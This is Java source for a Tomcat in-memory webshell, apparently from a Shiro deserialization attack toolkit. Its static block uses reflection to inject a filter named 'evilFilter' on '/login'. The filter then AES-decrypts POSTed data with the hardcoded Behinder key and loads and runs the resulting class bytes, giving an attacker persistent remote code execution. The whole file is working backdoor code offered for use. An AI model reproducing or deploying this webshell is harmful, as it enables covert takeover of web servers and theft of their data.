package com.govuln.shiroattack.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;


public class BehinderFilter_all extends AbstractTranslet implements Filter {
    static {
        try {
            System.out.println("start --------------------------------------------------------------");
            System.out.println("start --------------------------------------------------------------");
            System.out.println("start --------------------------------------------------------------");
            final String filterName = "evilFilter";

            WebappClassLoaderBase webappClassLoaderBase =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            System.out.println("WebappClassLoaderBase");

            Class<? extends StandardContext> aClass = null;
            try{
                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
                aClass.getDeclaredField("filterConfigs");
            }catch (Exception e){
                aClass = (Class<? extends StandardContext>) standardContext.getClass();
                aClass.getDeclaredField("filterConfigs");
            }

            System.out.println("success");

            Field Configs = aClass.getDeclaredField("filterConfigs");

            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);
            System.out.println("(Map) Configs.get");
            Filter filter = new BehinderFilter_all();

            System.out.println("filterConfigs");
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);
            System.out.println("standardContext.addFilterDef");

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/login");
            filterMap.setFilterName(filterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            System.out.println("standardContext.addFilterMapBefore");
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            filterConfigs.put(filterName,filterConfig);
            System.out.println("InjectFilter ----------------------------------");
            System.out.println("InjectFilter ----------------------------------");
            System.out.println("InjectFilter ----------------------------------");
        }catch (Exception exception){
            System.out.println(exception);
        }

    }

    public BehinderFilter_all() {
        super();
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try {
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put("request",request);
            pageContext.put("response",response);
            pageContext.put("session",session);


            System.out.println("behinder");
            //冰蝎逻辑
//             class U extends ClassLoader{
//                 U(ClassLoader c){
//                     super(c);
//                 }
//                 public Class g(byte []b){
//                     return super.defineClass(b,0,b.length);
//                 }
//             }


            if (request.getMethod().equals("POST")){
                String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u",k);
                Cipher c=Cipher.getInstance("AES");
                c.init(2,new SecretKeySpec(k.getBytes(),"AES"));

//                 new U(this.getClass().getClassLoader()).
//                         g(
//                                 c.doFinal(
//                                         new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())
//                                 )
//                         ).
//                         newInstance().equals(pageContext);

                //revision BehinderFilter
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);

            }
        }catch (Exception e){

        }
        System.out.println("behinder over");
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
